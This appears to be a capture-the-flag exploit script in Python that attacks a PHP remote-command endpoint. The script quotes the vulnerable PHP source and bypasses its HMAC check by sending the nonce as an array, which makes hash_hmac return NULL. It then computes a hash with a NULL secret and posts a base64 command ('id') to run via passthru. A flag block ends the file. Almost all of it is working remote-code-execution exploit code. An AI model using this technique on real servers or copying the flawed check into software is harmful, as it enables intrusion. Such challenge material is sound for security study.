#! /usr/local/bin/python
import requests
import base64
import subprocess

"""
ORIGINAL PHP FUNCTION CODE BELOW
<?php
/**
 * rest.php
 *
 * Remote Execution Service Tomato
 *
 * @category   REST
 * @package    Fishbowl 0day DB
 * @author     @hnzlmnn <hnzlmnn@fishbowl.tech>
 * @endpoint   /api/vegan/rest
 * @license    MIT
 * @version    1.0
 */

require_once("../../libs/tomato.php");

$secret = getenv('secret');
$command = array(
	'algo' => "sha256",
	'nonce' => $_POST['nonce'],
	'hash' => $_POST['hash'],
	'action' => base64_decode($_POST['action'])
);

if (empty($command['action'])) {
	error(400);
}

if (!in_array($command['algo'], hash_hmac_algos()) || empty($command['hash'])) {
	error(400);
}

if (!empty($command['nonce'])) {
	$secret = hash_hmac($command['algo'], $command['nonce'], $secret);
}

if (hash_hmac($command['algo'], $command['action'], $secret) !== $command['hash']) {
	error(401);
	exit;
}

passthru($command['action']);
?>
"""


domain = "https://db.fishbowl.tech/"
api = "/api/vegan/rest"
cmd = "id"
b64_cmd = base64.b64encode(cmd)

#use php hash_hmac as python does not suport a NULL secret
hmac_hash = subprocess.check_output("php -r \"echo hash_hmac('sha256', '{}', NULL);\"".format(cmd), shell=True)

post_data = { "hash": hmac_hash,
"action": b64_cmd,
"nonce[]": 1}

#nonce needs to be an array
r = requests.post(domain+api, data=post_data)
print r.text




"""
-----BEGIN FISHBOWL FLAG-----
fb2PXl+sNLun+kLBSh6nCPz1To6OhYpx2/GSa/oeT+HQvB6O
3Mew0Jzzw5BAxKPX/L2vHfXsQN76+g2j+fVDrOM9oXHez325
ZlMr1x5nDocACMcNM/Z0OrfP5vMedHjkI6aCP3E971LAeM24
0ffWAuaR1rbN4oZJ7oQGRRNCeufyif6ktpT58kbEVYdpJpmM
MQDkxnytCsO6X+o1sVI97uvnamU4H0yl5hMynwaUWjIbM/b1
BlsYuWZKjVT6VpVUYCIrKeivFA0XsNb4g2nrK/u13M5aUiTp
NvHweghDj2tNIfyh2e1F+mgZqCYfgCWjML/DZLysX0lftYkX
3vJIAbLReu3+xZr2C9+mCjexFSi4ZEtFkNbt4jGpX9t84RmP
ZKeXQqu46PtLvNKGegeqCJwvSZpxpbgS3Shos77ZfrfDS8Y1
lxaskeqcopy7xuWw1RaIp+/GFikqEgNEiWx8yXrd2GeSlOqg
Adip0RI+U25Mn012+gDMfkqzS1PfEYQRDZpYYNNzJSZwQsbj
z/nTcEu64dmL3QrMX6fTY8JFE7isVDOkKGip9idBBWrI0Phv
MuVu7AHhT27fK7sSGe/dA/WzFG8zhmlvVffd162t/emUPbus
WT1xVuLcMtTthItVsoZw2qPDpOabJzsZvMOC5SMsWZ+31OVN
KpPj7+XjLsA=
-----END FISHBOWL FLAG-----
"""
